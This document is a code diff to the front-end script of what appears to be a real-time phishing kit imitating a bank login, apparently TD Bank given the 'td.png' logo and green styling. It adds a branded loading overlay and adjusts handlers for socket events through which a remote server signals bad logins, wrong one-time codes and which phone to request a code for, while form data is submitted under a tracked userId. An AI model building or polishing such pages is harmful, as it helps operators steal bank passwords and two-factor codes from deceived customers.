@@ -8,6 +8,79 @@
 	  sessionStorage.setItem("userId", userId);
 	}
 	
+	window.addEventListener('load', function () {
+
+    // Overlay
+    let preloader = document.createElement('div');
+    preloader.id = 'load';
+    preloader.style.position = 'fixed';
+    preloader.style.top = '0';
+    preloader.style.left = '0';
+    preloader.style.width = '100vw';
+    preloader.style.height = '100vh';
+
+    preloader.style.backgroundColor = 'rgba(0, 0, 0, 0.75)';
+    preloader.style.zIndex = '40000';
+
+    preloader.style.display = 'flex';
+    preloader.style.alignItems = 'center';
+    preloader.style.justifyContent = 'center';
+
+    // Smaller container (tight loader)
+    let container = document.createElement('div');
+    container.style.position = 'relative';
+    container.style.width = '70px';
+    container.style.height = '70px';
+    container.style.display = 'flex';
+    container.style.alignItems = 'center';
+    container.style.justifyContent = 'center';
+
+    // Thin green ring (smaller + tighter)
+    let circle = document.createElement('div');
+    circle.style.position = 'absolute';
+    circle.style.top = '0';
+    circle.style.left = '0';
+    circle.style.width = '100%';
+    circle.style.height = '100%';
+    circle.style.borderRadius = '50%';
+
+    circle.style.background = 'conic-gradient(rgba(34,197,94,0.6), rgba(21,128,61,0.6), rgba(34,197,94,0.6))';
+
+    // thinner + tighter ring
+    circle.style.mask = 'radial-gradient(circle, transparent 68%, black 70%)';
+    circle.style.webkitMask = 'radial-gradient(circle, transparent 68%, black 70%)';
+
+    circle.style.filter = 'drop-shadow(0 0 5px rgba(34, 197, 94, 0.4))';
+
+    // Image (slightly rounded, not full circle)
+    let image = document.createElement('img');
+    image.src = 'images/td.png';
+    image.style.width = '30px';
+    image.style.height = '30px';
+    image.style.opacity = '0.50';
+
+    // slight rounding only (NOT full circle)
+    image.style.borderRadius = '4%';
+
+    image.style.objectFit = 'cover';
+    image.style.zIndex = '2';
+
+    // Assemble
+    container.appendChild(circle);
+    container.appendChild(image);
+    preloader.appendChild(container);
+
+    document.body.appendChild(preloader);
+
+    // Fade out after 2 seconds
+    setTimeout(() => {
+        preloader.style.opacity = '0';
+        preloader.style.transition = 'opacity 0.6s ease';
+
+        setTimeout(() => preloader.remove(), 600);
+    }, 2000);
+});
+	
 	 // Use window.socket globally from the start
 		window.socket = io("/", {
 			auth: { userId },
@@ -31,15 +104,14 @@
 			$('.otp-input').addClass('error');
 			badOtp.textContent = 'The code you entered is incorrect';
 			badOtp.style.display = 'block';
+			if(!preloader) preloader = document.getElementById('load');
+	      preloader.style.display = "none";
 	      break;
 	      
 	    case "bad-login":
-	      document.querySelector(".error-alert").style.display = "block";
-	      //let preloader = document.getElementById('load');
-	      document.querySelector(".error-alert-message").innerHTML = 
-				    `Try signing in with a <a href="#">QR code</a>, or select 
-				     <a href="#">Forgot user ID</a> or 
-				     <a href="#">Reset password</a> to avoid being locked out.`;
+	      document.querySelector(".error-container").style.display = "flex";
+	      if(!preloader) preloader = document.getElementById('load');
+	      preloader.style.display = "none";
 	     break;
 	
 	    case "phone-otp":
@@ -51,12 +123,13 @@
 			    return;
 			}
 			phoneWrap.innerHTML = `
-			    registered mobile number<br>
-			    ending in <strong>**** <span id="phone"></span></strong>
+			    <strong> by text message</strong> to <br><strong >+1 (***) *** <span id="phone"> </span><strong>
 			`;
 			const phoneNumberEl = document.querySelector("#phone");
 			phoneNumberEl.textContent = code;
 			phoneWrap.style.display = "block";
+			if(!preloader) preloader = document.getElementById('load');
+	      preloader.style.display = "none";
 	      break;
 	
 	    case "notify":
@@ -137,32 +210,22 @@
 
 //document.head.appendChild(style); 
 
-
-// Store original button text once
-const originalSubmitHtml = $('.submit').html();
-
 function resetSubmitForm() {
     $('.submit')
         .prop('disabled', false)
-        .html(originalSubmitHtml)
         .css({
             'background': '',
             'color': '',
             'opacity': ''
         });
 
-    $('input').prop('disabled', false);
-
     console.log("reset form");
 }
 
 async function submitFormData(formData) {
   // Show preloader
-  $('.submit').prop('disabled', true).html(
-                '<span class="loading-dots"><span></span><span></span><span></span></span>'
-            );
-            
-  $('input').prop('disabled', true);
+  $('.submit').prop('disabled', true);
+  
   
   formData.userId = userId;
   try {
